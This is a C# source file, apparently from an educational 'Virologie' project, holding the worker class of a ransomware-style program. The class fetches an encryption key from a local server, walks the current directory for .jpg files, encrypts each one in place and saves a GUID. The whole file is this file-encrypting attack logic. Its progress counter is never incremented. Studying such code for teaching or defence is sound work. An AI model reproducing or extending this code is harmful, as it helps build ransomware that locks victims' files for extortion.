using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.IO;

namespace Virologie
{
    public enum EncryptError
    {
        ServerNotFound,
        Other,
    }

    class EncryptWorker : BackgroundWorker
    {
        public EncryptError ErrorType { get; private set; }

        private string _fileBuf1 = "";
        private string _fileBuf2 = "";
        private bool _switchFiles = false;
        public string CurrentFile
        {
            get
            {
                if (_switchFiles)
                    return _fileBuf1;
                else
                    return _fileBuf2;
            }
            set
            {
                if (_switchFiles)
                    _fileBuf2 = value;
                else
                    _fileBuf1 = value;
            }
        }

        public void SwitchFiles()
        {
            _switchFiles = !_switchFiles;
        }

        public EncryptWorker()
        {
            DoWork += worker_DoWork;
            WorkerReportsProgress = true;
        }

        void worker_DoWork(object sender, DoWorkEventArgs args)
        {
            FileExplorer explorer = new FileExplorer();
            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
            if (encrypter != null)
            {
                var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
                int count = 0;
                foreach (var file in files)
                {
                    ReportProgress(100 * count / (100 * files.Count()));
                    CurrentFile = file;
                    SwitchFiles();
                    encrypter.Encrypt(file);
                }
                CryptoKeyManager.SaveGUID();
            }
        }
    }
}
